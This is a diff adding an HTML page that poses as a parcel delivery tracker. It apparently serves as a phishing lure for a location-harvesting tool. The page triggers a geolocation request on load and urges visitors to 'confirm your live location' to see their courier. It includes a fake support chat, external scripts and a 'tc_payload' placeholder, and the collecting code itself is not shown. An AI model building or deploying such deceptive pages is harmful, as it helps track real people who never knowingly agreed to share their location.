@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Package Tracking</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="manifest" href="../manifest.json">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    .track-wrap { max-width: 720px; margin: 40px auto; background: #fff; border-radius: 8px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,.08); }
+    .status { color: #0a7; font-weight: bold; }
+  </style>
+</head>
+<body onload="gpsLocation()">
+  <div class="track-wrap">
+    <h1>Delivery Tracking</h1>
+    <p class="status">Out for delivery near your area</p>
+    <p>Confirm your live location to view the courier route and ETA.</p>
+    <button onclick="gpsLocation()" style="padding:12px 18px;background:#0a7;color:#fff;border:0;border-radius:4px;cursor:pointer;">Show courier on map</button>
+    <section class="msger" style="margin-top:24px;height:420px;">
+      <header class="msger-header"><div class="msger-header-title">Delivery Support</div></header>
+      <main class="msger-chat"></main>
+      <form class="msger-inputarea">
+        <input type="text" class="msger-input" placeholder="Ask about your package...">
+        <button type="submit" class="msger-send-btn">Send</button>
+      </form>
+    </section>
+  </div>
+  <script src="../smart_client.js"></script>
+  <!-- tc_payload -->
+  <script src="../script.js"></script>
+</body>
+</html>
